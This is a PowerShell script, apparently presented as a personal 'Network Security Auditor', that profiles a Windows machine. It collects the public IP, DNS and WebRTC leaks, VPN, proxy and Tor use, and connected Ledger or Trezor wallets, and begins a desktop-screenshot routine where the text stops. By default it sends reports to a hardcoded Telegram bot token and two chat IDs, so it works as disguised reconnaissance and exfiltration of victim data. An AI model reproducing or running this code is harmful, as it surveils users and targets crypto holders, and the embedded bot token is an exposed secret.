#Requires -Version 5.1
<#
Network Security Auditor v6 - verified local screenshot + desktop overlay.
Windows 10/11, PowerShell 5.1+. No credential extraction, no remote subnet scan.
External services: ipify, ipwho.is, api.ipapi.is (optional key), bash.ws,
Google/Cloudflare STUN servers, Telegram Bot API (explicitly configured).
Run ONLY on machines and networks you own or administer.
#>
[CmdletBinding()]
param(
    [switch]$SendTelegram = $true,
    [switch]$IncludeLocalDetails = $true,
    [switch]$AttachJson,
    [switch]$SkipBrowserTest,
    [switch]$CheckGatewayPorts,
    [switch]$TestTelegramOnly,
    [switch]$TestScreenshotOnly,
    [switch]$EnableDeviceLocation,
    [switch]$ReverseGeocode,
    [switch]$SharePreciseLocationInTelegram,
    [switch]$SendReportImage = $true,
    [string]$OutputDir = (Join-Path $env:USERPROFILE 'Documents\NetworkAudit'),
    [string]$TelegramBotToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk',
    [string]$TelegramChatIds = '8640543929,8362186234',
    [string]$IpIntelApiKey = $env:IPAPI_IS_KEY,
    [string]$ExpectedDnsResolverIPs = '',
    [string]$ExpectedVpnPublicIPv4 = ''
)

$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
try { Add-Type -AssemblyName System.Net.Http -ErrorAction Stop } catch {}
try { Add-Type -AssemblyName System.Drawing -ErrorAction Stop } catch {}
try { Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop } catch {}
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
New-Item -Path $OutputDir -ItemType Directory -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$errorsList = New-Object 'System.Collections.Generic.List[string]'
$findings = New-Object 'System.Collections.Generic.List[object]'
$sentTo=New-Object 'System.Collections.Generic.List[string]'
$telegramFailures=New-Object 'System.Collections.Generic.List[string]'

function Safe([scriptblock]$Action, [string]$What) {
    try { return (& $Action) } catch {
        $message=$_.Exception.Message
        if($TelegramBotToken){$message=$message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')}
        if($IpIntelApiKey){$message=$message.Replace($IpIntelApiKey,'[IP_API_KEY_REDACTED]')}
        $script:errorsList.Add("${What}: $message")
        return $null
    }
}
function OneLine($s, [string]$Default = 'unknown') {
    if ($null -eq $s -or [string]::IsNullOrWhiteSpace([string]$s)) { return $Default }
    return ([string]$s).Trim()
}
function Html($s) {
    if ($null -eq $s) { return '' }
    return [System.Net.WebUtility]::HtmlEncode([string]$s)
}
function Add-Finding([string]$Level, [string]$Ru, [string]$En, [int]$Penalty) {
    $script:findings.Add([ordered]@{level=$Level;ru=$Ru;en=$En;penalty=$Penalty})
}
function Get-JsonUrl([string]$Url) {
    Invoke-RestMethod -Uri $Url -TimeoutSec 12 -Headers @{'User-Agent'='NetworkSecurityAuditor/1.0'}
}
function Get-TextUrl([string]$Url) {
    return (Invoke-WebRequest -Uri $Url -UseBasicParsing -TimeoutSec 10).Content.Trim()
}
function Ping-Sample([string]$HostName, [int]$Count=3) {
    $p = New-Object System.Net.NetworkInformation.Ping
    $times = @()
    for ($i=0; $i -lt $Count; $i++) {
        try {
            $r = $p.Send($HostName,1200)
            if ($r.Status -eq [System.Net.NetworkInformation.IPStatus]::Success) { $times += [int]$r.RoundtripTime }
        } catch {}
    }
    $p.Dispose()
    $avg=$null
    if ($times.Count -gt 0) { $avg=[math]::Round((($times | Measure-Object -Average).Average),1) }
    return [ordered]@{sent=$Count;received=$times.Count;loss_percent=[math]::Round(100*($Count-$times.Count)/$Count,1);avg_ms=$avg;samples_ms=@($times)}
}
function Tcp-Connect([string]$HostName,[int]$Port,[int]$TimeoutMs=600) {
    $client = New-Object Net.Sockets.TcpClient
    try {
        $async=$client.BeginConnect($HostName,$Port,$null,$null)
        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs,$false)) { return $false }
        $client.EndConnect($async); return $true
    } catch { return $false }
    finally { $client.Close() }
}
function Get-WebRtcBrowserTest([string]$BrowserDnsId) {
    # Actual default-browser ICE/STUN test. Also causes browser-originated
    # DNS queries to unique hostnames, detecting browser DoH split behavior.
    # Only a random localhost HTTP listener is opened (127.0.0.1).
    $listener=$null
    try {
        $portPicker=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback,0)
        $portPicker.Start(); $port=$portPicker.LocalEndpoint.Port; $portPicker.Stop()
        $listener=New-Object Net.HttpListener
        $listener.Prefixes.Add("http://127.0.0.1:${port}/")
        $listener.Start()
        $htmlPage=@'
<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>Network Auditor | WebRTC + DNS</title>
<style>body{font:16px system-ui;max-width:720px;margin:8vh auto;padding:18px;background:#101727;color:#f5f7ff}article{border:1px solid #34415a;border-radius:14px;padding:24px}small{color:#b5c0d6}pre{font-size:12px;white-space:pre-wrap}</style>
</head><body><article><h2>🧪 WebRTC &amp; Browser DNS test</h2><p id="status">Идёт проверка браузера — подождите до 12 секунд.</p>
<small>Проверяются только WebRTC ICE-адреса и DNS-маршрут для случайных тестовых доменов. Пароли, cookies, история и кошельки браузера не читаются. После проверки закройте вкладку.</small>
<pre id="result"></pre></article>
<script>
(async function(){
 const status=document.querySelector('#status'),result=document.querySelector('#result');
 let candidates=[],failure=null,brDnsTries=0;
 const dnsId='__BROWSER_DNS_ID__';
 if(/^\d{4,20}$/.test(dnsId)) {
  const probes=[];
  for(let i=1;i<=10;i++){
   const img=new Image(); probes.push(img);
   img.src='https://'+i+'.'+dnsId+'.bash.ws/probe.png?r='+Math.random();
   brDnsTries++;
  }
  window.__auditDnsImages=probes;
 }
 try {
  if(!window.RTCPeerConnection)throw Error('WebRTC API disabled/unavailable');
  const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]});
  pc.onicecandidate=(e)=>{
   if(!e.candidate)return;
   const s=e.candidate.candidate||'';
   // candidate:foundation component transport priority address port typ host|srflx|relay|prflx
   const m=s.match(/^candidate:\S+\s+\d+\s+\S+\s+\d+\s+(\S+)\s+\d+\s+typ\s+(host|srflx|relay|prflx)/i);
   if(m)candidates.push({address:m[1],type:m[2].toLowerCase()});
  };
  pc.createDataChannel('network-audit');
  await pc.setLocalDescription(await pc.createOffer());
  await Promise.race([
   new Promise(r=>{if(pc.iceGatheringState==='complete')r();else pc.addEventListener('icegatheringstatechange',()=>{if(pc.iceGatheringState==='complete')r()})}),
   new Promise(r=>setTimeout(r,10000))
  ]);
  pc.close();
 }catch(e){failure=String(e.message||e)}
 // Give the browser DNS resolver time to dispatch the probes.
 await new Promise(r=>setTimeout(r,750));
 const unique=[...new Map(candidates.map(c=>[c.type+'|'+c.address,c])).values()];
 const value={status:failure?'error':'finished',error:failure,candidates:unique,browser_dns_probe_attempts:brDnsTries,
  user_agent:navigator.userAgent.substring(0,200)};
 result.textContent=JSON.stringify(value,null,2);
 try {const r=await fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(value)});
  status.textContent=r.ok?'Тест завершён. Можно закрыть вкладку.':'Не удалось передать результат программе.';}
 catch(e){status.textContent='Результат не передан программе: '+e.message}
})();
</script></body></html>
'@
        $htmlPage=$htmlPage.Replace('__BROWSER_DNS_ID__', $BrowserDnsId)
        Start-Process "http://127.0.0.1:${port}/" | Out-Null
        $deadline=(Get-Date).AddSeconds(29)
        while ((Get-Date) -lt $deadline) {
            $task=$listener.GetContextAsync()
            $remaining=[math]::Max(50,[int](($deadline-(Get-Date)).TotalMilliseconds))
            if (-not $task.Wait($remaining)) { break }
            $ctx=$task.Result
            if ($ctx.Request.HttpMethod -eq 'GET' -and $ctx.Request.Url.AbsolutePath -eq '/') {
                $body=[Text.Encoding]::UTF8.GetBytes($htmlPage)
                $ctx.Response.ContentType='text/html; charset=utf-8'
                $ctx.Response.ContentLength64=$body.Length
                $ctx.Response.OutputStream.Write($body,0,$body.Length)
                $ctx.Response.Close()
            } elseif ($ctx.Request.HttpMethod -eq 'POST' -and $ctx.Request.Url.AbsolutePath -eq '/submit') {
                if ($ctx.Request.ContentLength64 -gt 32768 -or $ctx.Request.ContentLength64 -lt 0) {
                    $ctx.Response.StatusCode=413;$ctx.Response.Close();break
                }
                $reader=New-Object IO.StreamReader($ctx.Request.InputStream,[Text.Encoding]::UTF8)
                $raw=$reader.ReadToEnd();$reader.Dispose()
                $ctx.Response.StatusCode=200;$ctx.Response.Close()
                return ($raw | ConvertFrom-Json)
            } else { $ctx.Response.StatusCode=404;$ctx.Response.Close() }
        }
        return [pscustomobject]@{status='timeout';error='No browser result within 29 seconds';candidates=@();browser_dns_probe_attempts=0}
    } catch {
        return [pscustomobject]@{status='unavailable';error=$_.Exception.Message;candidates=@();browser_dns_probe_attempts=0}
    } finally { if($null -ne $listener){try{$listener.Stop();$listener.Close()}catch{}} }
}
function Get-DnsProbe([string]$Id,[bool]$GenerateQueries) {
    $data=[ordered]@{status='unknown';observed_resolvers=@();vendor_conclusion=$null;provider_reported_ip=$null;note='Actual upstream resolvers; comparison needs an expected DNS/VPN baseline'}
    if([string]::IsNullOrWhiteSpace($Id)){$data.status='no_test_id';return $data}
    try {
        if($GenerateQueries) {
            for($i=1;$i -le 12;$i++) {
                $hostName="${i}.${Id}.bash.ws"
                try {
                    # Resolve-DnsName exercises Windows DNS resolution path; even NXDOMAIN
                    # can reach authoritative DNS and reveal recursive resolver egress.
                    Resolve-DnsName -Name $hostName -Type A -DnsOnly -ErrorAction Stop | Out-Null
                }catch{}
            }
        }
        Start-Sleep -Milliseconds 800
        $observed=Get-JsonUrl ("https://bash.ws/dnsleak/test/{0}?json=2" -f $Id)
        $errorEntries=@($observed | Where-Object {$_.type -eq 'error'})
        $data.observed_resolvers=@($observed | Where-Object {$_.type -eq 'dns'} | ForEach-Object {
            [ordered]@{ip=$_.ip;country=$_.country_name;region=$_.region_name;asn=$_.asn;city=$_.city_name}
        })
        $conclusion=($observed | Where-Object {$_.type -eq 'conclusion'} | Select-Object -First 1)
        if($conclusion){$data.vendor_conclusion=OneLine $conclusion.ip}
        $who=($observed | Where-Object {$_.type -eq 'ip'} | Select-Object -First 1)
        if($who){$data.provider_reported_ip=$who.ip}
        if($errorEntries.Count -gt 0){$data.status='incomplete';$data.note=($errorEntries | ForEach-Object {$_.text}) -join '; '}
        elseif($data.observed_resolvers.Count -gt 0){$data.status='observed; verify expected VPN/DNS route'}
        else{$data.status='inconclusive: no DNS resolvers observed'}
    }catch{$data.status='unavailable';$data.note=$_.Exception.Message}
    return $data
}
function Get-DnsId {
    try {
        $id=(Get-TextUrl 'https://bash.ws/id').Trim()
        if($id -match '^\d{4,20}$'){return $id}
    }catch{$script:errorsList.Add('DNS ID: '+$_.Exception.Message)}
    return ''
}
function Is-PublicV4([string]$Address) {
    $ip=$null
    if(-not [Net.IPAddress]::TryParse($Address,[ref]$ip) -or $ip.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork){return $false}
    $octets=$ip.GetAddressBytes()
    if($octets[0] -in @(0,10,127) -or $octets[0] -ge 224){return $false}
    if($octets[0] -eq 169 -and $octets[1] -eq 254){return $false}
    if($octets[0] -eq 172 -and $octets[1] -ge 16 -and $octets[1] -le 31){return $false}
    if($octets[0] -eq 192 -and $octets[1] -eq 168){return $false}
    if($octets[0] -eq 100 -and $octets[1] -ge 64 -and $octets[1] -le 127){return $false}
    if($octets[0] -eq 192 -and $octets[1] -eq 0 -and $octets[2] -eq 2){return $false}
    if($octets[0] -eq 198 -and $octets[1] -eq 51 -and $octets[2] -eq 100){return $false}
    if($octets[0] -eq 203 -and $octets[1] -eq 0 -and $octets[2] -eq 113){return $false}
    return $true
}

function Get-IntelBoolean($Object,[string]$Field) {
    # A missing field in anonymous IP lookup is UNKNOWN, never false.
    if($null -eq $Object){return $null}
    $prop=$Object.PSObject.Properties[$Field]
    if($null -eq $prop -or $null -eq $prop.Value){return $null}
    $v=$prop.Value
    if($v -is [bool]){return $v}
    if([string]$v -match '^(?i:false|0|no)$'){return $false}
    if([string]$v -match '^(?i:true|1|yes)$'){return $true}
    # The provider documents some truthy VPN flags that are not Boolean.
    return $true
}
function Get-VpnStatus($AllAdapters,$CurrentAdapter,$IpIntel) {
    $detected=New-Object 'System.Collections.Generic.List[string]'
    $checked=$false
    $connectionNames=New-Object 'System.Collections.Generic.List[string]'
    foreach($allUser in @($false,$true)) {
        try {
            $c=if($allUser){@(Get-VpnConnection -AllUserConnection -ErrorAction Stop)}else{@(Get-VpnConnection -ErrorAction Stop)}
            $checked=$true
            foreach($entry in $c) {
                if([string]$entry.ConnectionStatus -eq 'Connected') {
                    $label=OneLine $entry.Name 'Unnamed Windows VPN'
                    if(-not $connectionNames.Contains($label)){$connectionNames.Add($label)}
                    $hint='Windows VPN active: '+$label
                    if(-not $detected.Contains($hint)){$detected.Add($hint)}
                }
            }
        }catch { }
    }
    $adapterChecked=$null -ne $AllAdapters
    foreach($nic in @($AllAdapters)) {
        if($null -eq $nic){continue}
        $caption=([string]$nic.Name+' '+[string]$nic.InterfaceDescription)
        if([string]$nic.Status -ne 'Up'){continue}
        if($caption -match '(?i)wireguard|wintun|openvpn|tap.windows|nordlynx|tailscale|zerotier|proton.?vpn|surfshark|windscribe|softether|anyconnect|globalprotect|fortinet|forticlient|cloudflare.?warp|adguard.?vpn|amnezia|pritunl|outline.?vpn|mullvad|ivpn|expressvpn|cyberghost|vpn.?tunnel') {
            $hint='Active VPN-like adapter: '+(OneLine $nic.Name)
            if(-not $detected.Contains($hint)){$detected.Add($hint)}
        }
    }
    $exitFlag=Get-IntelBoolean $IpIntel 'is_vpn'
    $status=if($detected.Count -gt 0 -or $exitFlag -eq $true){'ON'}elseif($checked -or $adapterChecked){'NOT_DETECTED'}else{'UNKNOWN'}
    return [ordered]@{
        status=$status
        local_tunnel=if($detected.Count -gt 0){'DETECTED'}elseif($checked -or $adapterChecked){'NOT_DETECTED'}else{'UNKNOWN'}
        active_connections=@($connectionNames.ToArray())
        evidence=@($detected.ToArray())
        external_exit_ip=if($null -eq $exitFlag){'UNKNOWN (IP intelligence key required)'}elseif($exitFlag){'VPN EXIT FLAGGED'}else{'NOT FLAGGED'}
        note='Active Windows VPN interfaces and Windows VPN profiles are examined; proxy/browser-only VPNs or stealth tunnels can be missed. An exit-IP flag is not proof that this PC has a VPN client.'
    }
}
function Get-ProxyStatus {
    $signals=New-Object 'System.Collections.Generic.List[string]'
    $possible=New-Object 'System.Collections.Generic.List[string]'
    $checked=$false
    try {
        $r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction Stop
        $checked=$true
        if([int]$r.ProxyEnable -eq 1 -and -not [string]::IsNullOrWhiteSpace([string]$r.ProxyServer)) {
            $signals.Add('Windows user proxy enabled (WinINET)')
        }
        if(-not [string]::IsNullOrWhiteSpace([string]$r.AutoConfigURL)) {
            $possible.Add('PAC script configured (proxy use depends on its rules)')
        }
        if([int]$r.AutoDetect -eq 1){$possible.Add('WPAD / automatically detect proxy settings enabled')}
    }catch{}
    try {
        $out=((& netsh winhttp show proxy 2>$null) | Out-String)
        if(-not [string]::IsNullOrWhiteSpace($out)){$checked=$true}
        # netsh display is localized. Only confidently identify explicit server lines.
        if($out -match '(?im)^\s*(?:Proxy Server\(s\)|Proxy Server|Прокси-сервер|Прокси сервер)\s*:\s*(\S.+)$') {
            $server=$Matches[1].Trim()
            if($server -notmatch '(?i)\b(direct|нет|отсутствует|none)\b'){$signals.Add('WinHTTP proxy server configured')}
        }
    }catch{}
    foreach($key in @('HTTP_PROXY','HTTPS_PROXY','ALL_PROXY','http_proxy','https_proxy','all_proxy')) {
        $value=[Environment]::GetEnvironmentVariable($key,'Process')
        if(-not [string]::IsNullOrWhiteSpace($value)) {
            $checked=$true
            $label='Proxy environment variable: '+$key
            if(-not $signals.Contains($label)){$signals.Add($label)}
        }
    }
    $status=if($signals.Count -gt 0){'ON'}elseif($possible.Count -gt 0){'AUTO_CONFIGURED'}elseif($checked){'NOT_DETECTED'}else{'UNKNOWN'}
    return [ordered]@{
        status=$status;evidence=@($signals.ToArray());possible=@($possible.ToArray())
        note='Proxy is detected from WinINET, WinHTTP and process environment. PAC/WPAD may be direct or proxied; per-browser extensions, app-specific SOCKS settings and network gateways are not covered.'
    }
}
function Get-TorStatus([string]$PublicIPv4,$IpIntel) {
    $processStatus='UNKNOWN';$localPorts='UNKNOWN'
    try {
        $torProcesses=@(Get-Process -Name 'tor','lyrebird','obfs4proxy' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName -Unique)
        $processStatus=if($torProcesses.Count -gt 0){'DETECTED'}else{'NOT_DETECTED'}
    } catch {}
    try {
        $torSocks=@(Get-NetTCPConnection -State Listen -ErrorAction Stop | Where-Object {$_.LocalPort -in @(9050,9150) -and $_.LocalAddress -in @('127.0.0.1','::1','0.0.0.0','::')})
        $localPorts=if($torSocks.Count -gt 0){'POSSIBLE_TOR_SOCKS'}else{'NOT_DETECTED'}
    }catch{}
    $exitListStatus='UNKNOWN';$exitListNotes='Not checked'
    if(-not [string]::IsNullOrWhiteSpace($PublicIPv4) -and (Is-PublicV4 $PublicIPv4)) {
        try {
            $txt=Get-TextUrl 'https://check.torproject.org/torbulkexitlist'
            $ips=@($txt -split '[\r\n]+' | Where-Object {$_ -match '^\d{1,3}(?:\.\d{1,3}){3}$'})
            if($ips.Count -gt 100) {
                $exitListStatus=if($PublicIPv4 -in $ips){'TOR_EXIT_FLAGGED'}else{'NOT_FLAGGED'}
                $exitListNotes='Tor Project bulk exit list; checks only the observed HTTP public IPv4'
            }else{$exitListNotes='Tor exit list returned too few addresses for a reliable check'}
        }catch{$exitListNotes='Tor exit list unavailable: '+$_.Exception.Message}
    }
    $vendorExit=Get-IntelBoolean $IpIntel 'is_tor'
    $status=if($processStatus -eq 'DETECTED' -or $exitListStatus -eq 'TOR_EXIT_FLAGGED' -or $vendorExit -eq $true) {'ON'}
            elseif($localPorts -eq 'POSSIBLE_TOR_SOCKS') {'POSSIBLE'}
            elseif($processStatus -eq 'NOT_DETECTED') {'NOT_DETECTED'}else{'UNKNOWN'}
    return [ordered]@{
        status=$status;tor_process=$processStatus;socks_ports=$localPorts
        exit_ip_tor_project=$exitListStatus
        exit_ip_ip_intelligence=if($null -eq $vendorExit){'UNKNOWN'}elseif($vendorExit){'TOR_EXIT_FLAGGED'}else{'NOT_FLAGGED'}
        list_note=$exitListNotes
        note='Tor can be used in an isolated browser or through a remote proxy without changing the system public IP; no local evidence is not proof of absence. A Tor-exit IP alone does not prove a local Tor client is running.'
    }
}
function Get-HardwareWalletStatus {
    $inventory=@();$source='Get-PnpDevice -PresentOnly';$valid=$false;$fallback=$false
    try {
        $inventory=@(Get-PnpDevice -PresentOnly -ErrorAction Stop)
        $valid=$true
    }catch {
        try {
            # Win32_PnPEntity sometimes includes cached/ghost devices. Fallback is a weak signal only.
            $inventory=@(Get-CimInstance -ClassName Win32_PnPEntity -ErrorAction Stop | Where-Object {$_.ConfigManagerErrorCode -eq 0})
            $source='Win32_PnPEntity (fallback; connection may be cached)';$valid=$true;$fallback=$true
        }catch{$source='Device enumeration unavailable'}
    }
    $out=@{}
    foreach($brand in @('Ledger','Trezor')) {
        $hits=New-Object 'System.Collections.Generic.List[object]'
        $seen=New-Object 'System.Collections.Generic.HashSet[string]'
        if($valid){
            foreach($dev in $inventory){
                $id=if($dev.PSObject.Properties['InstanceId']){[string]$dev.InstanceId}else{[string]$dev.PNPDeviceID}
                $name=if($dev.PSObject.Properties['FriendlyName']){[string]$dev.FriendlyName}else{[string]$dev.Name}
                $mfg=if($dev.PSObject.Properties['Manufacturer']){[string]$dev.Manufacturer}else{''}
                $pnp=$id.ToUpperInvariant()
                $byId=if($brand -eq 'Ledger'){$pnp -match 'VID_2C97'}else{($pnp -match 'VID_1209&PID_53C[0-3]') -or ($pnp -match 'VID_534C')}
                $byName=(($name+' '+$mfg) -match ('(?i)\b'+$brand+'\b'))
                if(-not ($byId -or $byName)){continue}
                $vidpid=if($id -match '(?i)(VID_[0-9A-F]{4}&PID_[0-9A-F]{4})'){$Matches[1].ToUpperInvariant()}else{'Not supplied'}
                $label=OneLine $name 'USB/HID wallet interface'
                $status=OneLine $dev.Status 'unknown'
                $dedup=$label+'|'+$vidpid+'|'+$status
                if($seen.Add($dedup)){
                    $hits.Add([ordered]@{name=$label;vid_pid=$vidpid;driver_status=$status;matched_by=if($byId){'USB vendor/product ID'}else{'PnP device name'}})
                }
            }
        }
        $out[$brand.ToLowerInvariant()]=[ordered]@{
            status=if(-not $valid){'UNKNOWN'}elseif($hits.Count -eq 0){'NOT_DETECTED'}elseif($fallback){'POSSIBLE'}else{'DETECTED'}
            interfaces_detected=$hits.Count
            devices=@($hits.ToArray())
            note=if($fallback){'Fallback Windows inventory can include cached devices; not confirmed connected'}else{'Present USB/HID interfaces, not guaranteed count of physical wallets; device identification is heuristic'}
        }
    }
    return [ordered]@{
        source=$source;ledger=$out['ledger'];trezor=$out['trezor']
        privacy='No hardware wallet keys, serial numbers, addresses, software data, secrets or seed phrases are collected'
    }
}
function Status-Text([string]$Status) {
    switch ($Status) {
        'ON' {'🟢 ВКЛЮЧЁН / ON';break}
        'DETECTED' {'🟢 ОБНАРУЖЕН / DETECTED';break}
        'POSSIBLE' {'🟠 ВОЗМОЖНО / POSSIBLE';break}
        'AUTO_CONFIGURED' {'🟠 АВТОНАСТРОЙКА / AUTO';break}
        'NOT_DETECTED' {'⚪ НЕ ОБНАРУЖЕН / NOT DETECTED';break}
        default {'⚪ НЕИЗВЕСТНО / UNKNOWN'}
    }
}

function Tg-TargetIds {
    return @($TelegramChatIds -split '[,;\s]+' | Where-Object { $_ -match '^-?\d+$' } | Select-Object -Unique)
}
function Send-Tg([string]$Content) {
    if(-not $SendTelegram){return}
    $endpoint="https://api.telegram.org/bot${TelegramBotToken}/sendMessage"
    foreach($id in (Tg-TargetIds)) {
        try {
            $req=@{chat_id=$id;text=$Content;parse_mode='HTML';disable_web_page_preview=$true}
            $bytes=[Text.Encoding]::UTF8.GetBytes(($req | ConvertTo-Json -Depth 4 -Compress))
            $reply=Invoke-RestMethod -Uri $endpoint -Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes -TimeoutSec 18
            if(-not $reply.ok){throw 'Telegram did not return ok=true'}
            if(-not $script:sentTo.Contains([string]$id)){$script:sentTo.Add([string]$id)}
        }catch{
            $clean=$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')
            $script:telegramFailures.Add("Chat $id : $clean")
        }
    }
}
function Send-TgLong([string]$Title,[string]$Content) {
    if(-not $SendTelegram){return}
    $heading='<b>━━ '+(Html $Title)+' ━━</b>'
    $buffer=$heading
    foreach($line in ($Content -split "`r?`n")) {
        $line=[string]$line
        if($line -match '^([^:]{1,52}):\s*(.*)$'){
            $formatted='<b>'+(Html $Matches[1])+'</b>: <code>'+(Html $Matches[2])+'</code>'
        }elseif($line -match '^[^a-zа-я0-9]*[A-ZА-Я][A-ZА-Я\s/&•0-9—-]+$' -and $line.Length -lt 80){
            $formatted='<b>'+(Html $line)+'</b>'
        }else{$formatted=Html $line}
        if($formatted.Length -gt 2900){
            $formatted=(Html ($line.Substring(0,[math]::Min(450,$line.Length))))+' ... [cut; full text in local JSON/TXT]'
        }
        if($buffer.Length+$formatted.Length+2 -gt 3400){Send-Tg $buffer;$buffer=$heading}
        $buffer+="`n"+$formatted
    }
    if($buffer -ne $heading){Send-Tg $buffer}
}
function Send-TgDocument([string]$Path) {
    if(-not ($SendTelegram -and $AttachJson)){return}
    $http=New-Object System.Net.Http.HttpClient
    try {
        foreach($chatId in (Tg-TargetIds)){
            $form=$null
            try {
                $form=New-Object System.Net.Http.MultipartFormDataContent
                $form.Add(([System.Net.Http.StringContent]::new([string]$chatId)),'chat_id')
                $bytes=[IO.File]::ReadAllBytes($Path)
                $fileBytes=[System.Net.Http.ByteArrayContent]::new([byte[]]$bytes)
                $fileBytes.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::new('application/json')
                $form.Add($fileBytes,'document',[IO.Path]::GetFileName($Path))
                $res=$http.PostAsync("https://api.telegram.org/bot${TelegramBotToken}/sendDocument",$form).GetAwaiter().GetResult()
                $res.EnsureSuccessStatusCode() | Out-Null
            }catch{
                $clean=$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')
                $script:telegramFailures.Add("Chat $chatId JSON: $clean")
            }finally{if($null -ne $form){$form.Dispose()}}
        }
    }finally{$http.Dispose()}
}
function Invoke-WinRtOperation($Operation,[type]$ResultType,[int]$TimeoutMs=17000) {
    $methods=@([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.IsGenericMethodDefinition -and $_.GetParameters().Count -eq 1 })
    if($methods.Count -eq 0){throw 'WinRT AsTask<T> method is unavailable in this PowerShell runtime'}
    $m=$methods[0].MakeGenericMethod([type[]]@($ResultType))
    $task=$m.Invoke($null,[object[]]@($Operation))
    if(-not $task.Wait($TimeoutMs)) { throw 'Timed out while waiting for Windows location permissions/coordinates' }
    if($task.IsFaulted){ throw [string]$task.Exception }
    return $task.Result
}
function Get-WindowsLocation {
    # No BSSID harvesting. Windows itself selects GPS/Wi-Fi/cellular/IP sources.
    $info=[ordered]@{
        status='NOT_REQUESTED';latitude=$null;longitude=$null;accuracy_m=$null
        source='Windows Location Service';approximate_address=$null;street=$null
        house_number=$null;postcode=$null;city=$null;attribution=$null
        note='One-time Windows Location fix; not proof of address/GPS. Not shared via Telegram by default.'
    }
    if(-not $EnableDeviceLocation){return $info}
    Write-Host 'Location request: Windows Location Service. Exact coordinates may be stored in LOCAL JSON.' -ForegroundColor Yellow
    $answer=Read-Host 'Allow one-time device location request? Type YES / Разрешить геолокацию? Введите YES'
    if($answer -cne 'YES'){$info.status='DECLINED_BY_USER';return $info}
    try {
        Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
        $geolocatorType=[Windows.Devices.Geolocation.Geolocator, Windows.Devices.Geolocation, ContentType = WindowsRuntime]
        $positionType=[Windows.Devices.Geolocation.Geoposition, Windows.Devices.Geolocation, ContentType = WindowsRuntime]
        $accessType=[Windows.Devices.Geolocation.GeolocationAccessStatus, Windows.Devices.Geolocation, ContentType = WindowsRuntime]
        $permissionOp=$geolocatorType::RequestAccessAsync()
        $permission=Invoke-WinRtOperation $permissionOp $accessType 20000
        if([string]$permission -ne 'Allowed'){
            $info.status='PERMISSION_'+([string]$permission).ToUpperInvariant()
            $info.note='Enable Windows Settings > Privacy & security > Location; permit desktop applications.'
            return $info
        }
        $locator=New-Object Windows.Devices.Geolocation.Geolocator
        $locator.DesiredAccuracy=[Windows.Devices.Geolocation.PositionAccuracy]::High
        $fixOp=$locator.GetGeopositionAsync()
        $position=Invoke-WinRtOperation $fixOp $positionType 65000
        $coordinate=$position.Coordinate
        $info.latitude=[math]::Round([double]$coordinate.Point.Position.Latitude,6)
        $info.longitude=[math]::Round([double]$coordinate.Point.Position.Longitude,6)
        $info.accuracy_m=[math]::Round([double]$coordinate.Accuracy,0)
        $info.status='OK'
    } catch {
        $info.status='UNAVAILABLE'
        $info.note='Windows location unavailable: '+$_.Exception.Message+'. Check location permissions, desktop app access, foreground UI/STA, Wi-Fi/GPS availability.'
        return $info
    }
    if($ReverseGeocode -and $info.status -eq 'OK') {
        Write-Host 'Reverse geocoding would send coordinates to OpenStreetMap Nominatim (external service).' -ForegroundColor Yellow
        $answer2=Read-Host 'Send coordinates for approximate street lookup? Type YES / Отправить координаты картосервису? YES'
        if($answer2 -ceq 'YES') {
            try {
                $lat=$info.latitude.ToString([Globalization.CultureInfo]::InvariantCulture)
                $lon=$info.longitude.ToString([Globalization.CultureInfo]::InvariantCulture)
                $url="https://nominatim.openstreetmap.org/reverse?lat=$lat&lon=$lon&format=jsonv2&addressdetails=1&zoom=18"
                $headers=@{'User-Agent'='NetworkSecurityAuditor-Personal/4.0 (one-shot opt-in reverse geocoding)';'Accept-Language'='ru,en'}
                $reverse=Invoke-RestMethod -Uri $url -Headers $headers -TimeoutSec 16 -ErrorAction Stop
                if($reverse){
                    $info.approximate_address=[string]$reverse.display_name
                    $info.street=if($reverse.address.road){[string]$reverse.address.road}else{$null}
                    $info.house_number=if($reverse.address.house_number){[string]$reverse.address.house_number}else{$null}
                    $info.postcode=if($reverse.address.postcode){[string]$reverse.address.postcode}else{$null}
                    $info.city=if($reverse.address.city){[string]$reverse.address.city}elseif($reverse.address.town){[string]$reverse.address.town}else{$null}
                    $info.attribution='(c) OpenStreetMap contributors / Nominatim'
                    $info.note='Reverse geocoding returns a nearby map address, NOT a verified residence.'
                }
            } catch {$info.note+=' Reverse lookup failed: '+$_.Exception.Message}
        }
    }
    return $info
}
function New-AuditPng([string]$FilePath,$Lines,[int]$Score,[string]$Grade) {
    # v5: real desktop screenshot + diagnostic overlay instead of standalone card.
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop

    function _WrapOverlayText([string]$Text,[int]$Limit) {
        $result=New-Object 'System.Collections.Generic.List[string]'
        $remaining=[string]$Text
        if([string]::IsNullOrWhiteSpace($remaining)) { $result.Add(' '); return @($result) }
        while($remaining.Length -gt $Limit) {
            $cut=$remaining.LastIndexOf(' ',[Math]::Min($remaining.Length-1,$Limit))
            if($cut -lt [Math]::Max(10,[int]($Limit*0.45))){$cut=$Limit}
            $result.Add($remaining.Substring(0,$cut).Trim())
            $remaining=$remaining.Substring($cut).TrimStart()
        }
